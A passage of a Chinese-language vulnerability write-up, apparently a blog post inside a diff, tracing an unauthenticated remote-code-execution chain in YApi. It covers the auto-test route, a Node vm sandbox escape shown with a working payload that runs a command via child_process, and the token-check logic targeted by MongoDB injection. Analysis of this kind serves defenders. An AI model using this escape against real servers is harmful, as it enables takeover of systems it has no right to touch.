+></p>
+<p>这里我们去route找到相关的方法定义<code>runAutoTest</code></p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202172959122.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202172959122"
+	
+	
+></p>
+<p>再往下跟，可以发现这个api是需要我们传入token和id的，这样才能指定到那个项目的测试内容</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202173223849.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202173223849"
+	
+	
+></p>
+<p>然后就到我们的runAutoTest的方法了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js">  <span class="kr">async</span> <span class="nx">runAutoTest</span><span class="p">(</span><span class="nx">ctx</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">$tokenAuth</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">.</span><span class="nx">body</span> <span class="o">=</span> <span class="nx">yapi</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">resReturn</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="mi">40022</span><span class="p">,</span> <span class="s1">&#39;token 验证失败&#39;</span><span class="p">));</span>
+    <span class="p">}</span>
+    <span class="c1">// console.log(1231312)
+</span><span class="c1"></span>    <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">token</span><span class="p">;</span>
+
+    <span class="kr">const</span> <span class="nx">projectId</span> <span class="o">=</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">project_id</span><span class="p">;</span>
+    <span class="kr">const</span> <span class="nx">startTime</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">getTime</span><span class="p">();</span>
+    <span class="kr">const</span> <span class="nx">records</span> <span class="o">=</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">records</span> <span class="o">=</span> <span class="p">{});</span>
+    <span class="kr">const</span> <span class="nx">reports</span> <span class="o">=</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">reports</span> <span class="o">=</span> <span class="p">{});</span>
+    <span class="kr">const</span> <span class="nx">testList</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="kd">let</span> <span class="nx">id</span> <span class="o">=</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">id</span><span class="p">;</span>
+    <span class="kd">let</span> <span class="nx">curEnvList</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">handleEvnParams</span><span class="p">(</span><span class="nx">ctx</span><span class="p">.</span><span class="nx">params</span><span class="p">);</span>
+
+    <span class="kd">let</span> <span class="nx">colData</span> <span class="o">=</span> <span class="kr">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">interfaceColModel</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">colData</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">.</span><span class="nx">body</span> <span class="o">=</span> <span class="nx">yapi</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">resReturn</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="mi">40022</span><span class="p">,</span> <span class="s1">&#39;id值不存在&#39;</span><span class="p">));</span>
+    <span class="p">}</span>
+
+    <span class="kd">let</span> <span class="nx">projectData</span> <span class="o">=</span> <span class="kr">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">projectModel</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">projectId</span><span class="p">);</span>
+
+    <span class="kd">let</span> <span class="nx">caseList</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">yapi</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">getCaseList</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">caseList</span><span class="p">.</span><span class="nx">errcode</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">ctx</span><span class="p">.</span><span class="nx">body</span> <span class="o">=</span> <span class="nx">caseList</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nx">caseList</span> <span class="o">=</span> <span class="nx">caseList</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">l</span> <span class="o">=</span> <span class="nx">caseList</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">l</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+      <span class="kd">let</span> <span class="nx">item</span> <span class="o">=</span> <span class="nx">caseList</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
+      <span class="kd">let</span> <span class="nx">projectEvn</span> <span class="o">=</span> <span class="kr">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">projectModel</span><span class="p">.</span><span class="nx">getByEnv</span><span class="p">(</span><span class="nx">item</span><span class="p">.</span><span class="nx">project_id</span><span class="p">);</span>
+
+      <span class="nx">item</span><span class="p">.</span><span class="nx">id</span> <span class="o">=</span> <span class="nx">item</span><span class="p">.</span><span class="mi">_</span><span class="nx">id</span><span class="p">;</span>
+      <span class="kd">let</span> <span class="nx">curEnvItem</span> <span class="o">=</span> <span class="mi">_</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="nx">curEnvList</span><span class="p">,</span> <span class="nx">key</span> <span class="p">=&gt;</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">key</span><span class="p">.</span><span class="nx">project_id</span> <span class="o">==</span> <span class="nx">item</span><span class="p">.</span><span class="nx">project_id</span><span class="p">;</span>
+      <span class="p">});</span>
+
+      <span class="nx">item</span><span class="p">.</span><span class="nx">case_env</span> <span class="o">=</span> <span class="nx">curEnvItem</span> <span class="o">?</span> <span class="nx">curEnvItem</span><span class="p">.</span><span class="nx">curEnv</span> <span class="o">||</span> <span class="nx">item</span><span class="p">.</span><span class="nx">case_env</span> <span class="o">:</span> <span class="nx">item</span><span class="p">.</span><span class="nx">case_env</span><span class="p">;</span>
+      <span class="nx">item</span><span class="p">.</span><span class="nx">req_headers</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">handleReqHeader</span><span class="p">(</span><span class="nx">item</span><span class="p">.</span><span class="nx">req_headers</span><span class="p">,</span> <span class="nx">projectEvn</span><span class="p">.</span><span class="nx">env</span><span class="p">,</span> <span class="nx">item</span><span class="p">.</span><span class="nx">case_env</span><span class="p">);</span>
+      <span class="nx">item</span><span class="p">.</span><span class="nx">pre_script</span> <span class="o">=</span> <span class="nx">projectData</span><span class="p">.</span><span class="nx">pre_script</span><span class="p">;</span>
+      <span class="nx">item</span><span class="p">.</span><span class="nx">after_script</span> <span class="o">=</span> <span class="nx">projectData</span><span class="p">.</span><span class="nx">after_script</span><span class="p">;</span>
+      <span class="nx">item</span><span class="p">.</span><span class="nx">env</span> <span class="o">=</span> <span class="nx">projectEvn</span><span class="p">.</span><span class="nx">env</span><span class="p">;</span>
+      <span class="kd">let</span> <span class="nx">result</span><span class="p">;</span>
+      <span class="c1">// console.log(&#39;item&#39;,item.case_env)
+</span><span class="c1"></span>      <span class="k">try</span> <span class="p">{</span>
+        <span class="nx">result</span> <span class="o">=</span> <span class="kr">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">handleTest</span><span class="p">(</span><span class="nx">item</span><span class="p">);</span>
+      <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">result</span> <span class="o">=</span> <span class="nx">err</span><span class="p">;</span>
+      <span class="p">}</span>
+      
+     <span class="p">......</span>
+     <span class="p">......</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>前面都是对于id和token的验证，后面是从绑定的id和token中取出测试代码，然后进入<code>handleTest</code>执行</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202174407815.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202174407815"
+	
+	
+></p>
+<p>这里面就会走进我们最开始分析到的crossRequest</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202174443787.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202174443787"
+	
+	
+></p>
+<p>把脚本放进sandbox执行</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202174518861.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202174518861"
+	
+	
+></p>
+<p>继续更进sandboxByNode</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202174542003.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202174542003"
+	
+	
+></p>
+<p>这里就是一个vm2的逃逸，这里可以参考文章：https://xz.aliyun.com/t/11859#toc-6</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="kd">function</span> <span class="nx">sandboxByNode</span><span class="p">(</span><span class="nx">sandbox</span> <span class="o">=</span> <span class="p">{},</span> <span class="nx">script</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">);</span>
+  <span class="nx">script</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">Script</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
+  <span class="kr">const</span> <span class="nx">context</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">createContext</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">);</span>
+  <span class="nx">script</span><span class="p">.</span><span class="nx">runInContext</span><span class="p">(</span><span class="nx">context</span><span class="p">,</span> <span class="p">{</span>
+    <span class="nx">timeout</span><span class="o">:</span> <span class="mi">10000</span>
+  <span class="p">});</span>
+  <span class="k">return</span> <span class="nx">sandbox</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>用这样的payload即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s1">&#39;return process&#39;</span><span class="p">)().</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">&#39;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#39;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://tuchuang.huamang.xyz/img/image-20221202175107069.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202175107069"
+	
+	
+></p>
+<p>但是这个漏洞完全体是未授权状态下的RCE，那么我们就需要实现这几个点</p>
+<ol>
+<li>获取到id</li>
+<li>获取到token</li>
+<li>编辑脚本</li>
+</ol>
+<p>编辑脚本我们知道可以通过<code>/api/project/up</code>路由进行编辑，但是上面我们能编辑是因为我们登录进了后台，鉴权能够通过，但是漏洞是如何在未授权的情况下进行的编辑呢，我再debug一下</p>
+<p>如果我们退出登录，然后发一样的包，会被告知登录</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202181155439.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202181155439"
+	
+	
+></p>
+<p>debug后发现，这里的<code>inst.$auth === true</code>判断或过不了，那就得追到前面init里面</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202185900276.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202185900276"
+	
+	
+></p>
+<p>在base.js的init函数里面，首先判断路由是否在ignoreRouter里面，如果在就为true</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js">  <span class="kr">async</span> <span class="nx">init</span><span class="p">(</span><span class="nx">ctx</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">$user</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">tokenModel</span> <span class="o">=</span> <span class="nx">yapi</span><span class="p">.</span><span class="nx">getInst</span><span class="p">(</span><span class="nx">tokenModel</span><span class="p">);</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">projectModel</span> <span class="o">=</span> <span class="nx">yapi</span><span class="p">.</span><span class="nx">getInst</span><span class="p">(</span><span class="nx">projectModel</span><span class="p">);</span>
+    <span class="kd">let</span> <span class="nx">ignoreRouter</span> <span class="o">=</span> <span class="p">[</span>
+      <span class="s1">&#39;/api/user/login_by_token&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;/api/user/login&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;/api/user/reg&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;/api/user/status&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;/api/user/logout&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;/api/user/avatar&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;/api/user/login_by_ldap&#39;</span>
+    <span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">ignoreRouter</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">ctx</span><span class="p">.</span><span class="nx">path</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">this</span><span class="p">.</span><span class="nx">$auth</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="kr">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">checkLogin</span><span class="p">(</span><span class="nx">ctx</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">let</span> <span class="nx">openApiRouter</span> <span class="o">=</span> <span class="p">[</span>
+      <span class="s1">&#39;/api/open/run_auto_test&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;/api/open/import_data&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;/api/interface/add&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;/api/interface/save&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;/api/interface/up&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;/api/interface/get&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;/api/interface/list&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;/api/interface/list_menu&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;/api/interface/add_cat&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;/api/interface/getCatMenu&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;/api/interface/list_cat&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;/api/project/get&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;/api/plugin/export&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;/api/project/up&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;/api/plugin/exportSwagger&#39;</span>
+    <span class="p">];</span>
+
+    <span class="kd">let</span> <span class="nx">params</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">assign</span><span class="p">({},</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">query</span><span class="p">,</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
+    <span class="kd">let</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">params</span><span class="p">.</span><span class="nx">token</span><span class="p">;</span>
+
+    <span class="c1">// 如果前缀是 /api/open，执行 parse token 逻辑
+</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">token</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">openApiRouter</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">ctx</span><span class="p">.</span><span class="nx">path</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">path</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;/api/open/&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span> <span class="p">))</span> <span class="p">{</span>
+      
+      <span class="kd">let</span> <span class="nx">tokens</span> <span class="o">=</span> <span class="nx">parseToken</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span>
+
+      <span class="kr">const</span> <span class="nx">oldTokenUid</span> <span class="o">=</span> <span class="s1">&#39;999999&#39;</span>
+
+      <span class="kd">let</span> <span class="nx">tokenUid</span> <span class="o">=</span> <span class="nx">oldTokenUid</span><span class="p">;</span>
+
+      <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">tokens</span><span class="p">){</span>
+        <span class="kd">let</span> <span class="nx">checkId</span> <span class="o">=</span> <span class="kr">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">getProjectIdByToken</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">checkId</span><span class="p">)</span><span class="k">return</span><span class="p">;</span>
+      <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+        <span class="nx">token</span> <span class="o">=</span> <span class="nx">tokens</span><span class="p">.</span><span class="nx">projectToken</span><span class="p">;</span>
+        <span class="nx">tokenUid</span> <span class="o">=</span> <span class="nx">tokens</span><span class="p">.</span><span class="nx">uid</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="p">......</span>
+      <span class="p">......</span>
+     
+</code></pre></td></tr></table>
+</div>
+</div><p>如果不在就判断是否在<code>openApiRouter</code>里面，显然我们的路由是在<code>openApiRouter</code>里面的，所以就会检测是否存在token，如果没有token，那么就<code>inst.$auth = null</code>返回</p>
+<p>所以我们现在只要有token和id，那么就可以编辑对应项目的脚本了，那么我们的问题就缩小到只需要得到id和token</p>
+<p>那么这里就是通过sql注入来获取了</p>
+<h3 id="sql注入">SQL注入</h3>
+<p>首先是1.11.0对于MongoDB注入获取Token的修复，追踪到Github的<a class="link" href="https://github.com/YMFE/yapi/commit/432cdfeb29667eea8b82d72a265022ac9515bdb7"  target="_blank" rel="noopener"
+    >commit</a></p>
+<p>修复点在<code>controllers/base.js</code></p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202021939389.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202021939389"
+	
+	
+></p>
+<p>在62行的判断里加了一个</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="k">typeof</span> <span class="nx">token</span> <span class="o">===</span> <span class="s1">&#39;string&#39;</span> <span class="o">&amp;&amp;</span> 
+</code></pre></td></tr></table>
+</div>
+</div><p>那么显然我们得从token这个点进行注入了，通过debug来看看他对于token的处理</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202194019745.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202194019745"
+	
+	
+></p>
+<p>首先进入parseToken，会进行一个aseDecode</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="kr">const</span> <span class="nx">aseDecode</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
+  <span class="cm">/* 
+</span><span class="cm">   该方法使用指定的算法与密码来创建 decipher对象, 第一个算法必须与加密数据时所使用的算法保持一致;
+</span><span class="cm">   第二个参数用于指定解密时所使用的密码，其参数值为一个二进制格式的字符串或一个Buffer对象，该密码同样必须与加密该数据时所使用的密码保持一致
+</span><span class="cm">  */</span>
+  <span class="kr">const</span> <span class="nx">decipher</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createDecipher</span><span class="p">(</span><span class="s1">&#39;aes192&#39;</span><span class="p">,</span> <span class="nx">password</span><span class="p">);</span>
+
+  <span class="cm">/*
+</span><span class="cm">   第一个参数为一个Buffer对象或一个字符串，用于指定需要被解密的数据
+</span><span class="cm">   第二个参数用于指定被解密数据所使用的编码格式，可指定的参数值为 &#39;hex&#39;, &#39;binary&#39;, &#39;base64&#39;等，
+</span><span class="cm">   第三个参数用于指定输出解密数据时使用的编码格式，可选参数值为 &#39;utf-8&#39;, &#39;ascii&#39; 或 &#39;binary&#39;;
+</span><span class="cm">  */</span>
+  <span class="kd">let</span> <span class="nx">decrypted</span> <span class="o">=</span> <span class="nx">decipher</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="s1">&#39;hex&#39;</span><span class="p">,</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">);</span>
+
+  <span class="nx">decrypted</span> <span class="o">+=</span> <span class="nx">decipher</span><span class="p">.</span><span class="kr">final</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nx">decrypted</span><span class="p">;</span>
+<span class="p">};</span> 
+
+<span class="kr">const</span> <span class="nx">defaultSalt</span> <span class="o">=</span> <span class="s1">&#39;abcde&#39;</span><span class="p">;</span>
+
+<span class="nx">exports</span><span class="p">.</span><span class="nx">getToken</span> <span class="o">=</span> <span class="kd">function</span> <span class="nx">getToken</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">uid</span><span class="p">){</span>
+  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">token</span><span class="p">)</span><span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;token 不能为空&#39;</span><span class="p">)</span>
+  <span class="nx">yapi</span><span class="p">.</span><span class="nx">WEBCONFIG</span><span class="p">.</span><span class="nx">passsalt</span> <span class="o">=</span> <span class="nx">yapi</span><span class="p">.</span><span class="nx">WEBCONFIG</span><span class="p">.</span><span class="nx">passsalt</span> <span class="o">||</span> <span class="nx">defaultSalt</span><span class="p">;</span>
+  <span class="k">return</span> <span class="nx">aseEncode</span><span class="p">(</span><span class="nx">uid</span> <span class="o">+</span> <span class="s1">&#39;|&#39;</span> <span class="o">+</span> <span class="nx">token</span><span class="p">,</span> <span class="nx">yapi</span><span class="p">.</span><span class="nx">WEBCONFIG</span><span class="p">.</span><span class="nx">passsalt</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="nx">exports</span><span class="p">.</span><span class="nx">parseToken</span> <span class="o">=</span> <span class="kd">function</span> <span class="nx">parseToken</span><span class="p">(</span><span class="nx">token</span><span class="p">){</span>
+  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">token</span><span class="p">)</span><span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;token 不能为空&#39;</span><span class="p">)</span>
+  <span class="nx">yapi</span><span class="p">.</span><span class="nx">WEBCONFIG</span><span class="p">.</span><span class="nx">passsalt</span> <span class="o">=</span> <span class="nx">yapi</span><span class="p">.</span><span class="nx">WEBCONFIG</span><span class="p">.</span><span class="nx">passsalt</span> <span class="o">||</span> <span class="nx">defaultSalt</span><span class="p">;</span>
+  <span class="kd">let</span> <span class="nx">tokens</span><span class="p">;</span>
+  <span class="k">try</span><span class="p">{</span>
+    <span class="nx">tokens</span> <span class="o">=</span> <span class="nx">aseDecode</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">yapi</span><span class="p">.</span><span class="nx">WEBCONFIG</span><span class="p">.</span><span class="nx">passsalt</span><span class="p">)</span>
+  <span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){}</span>  
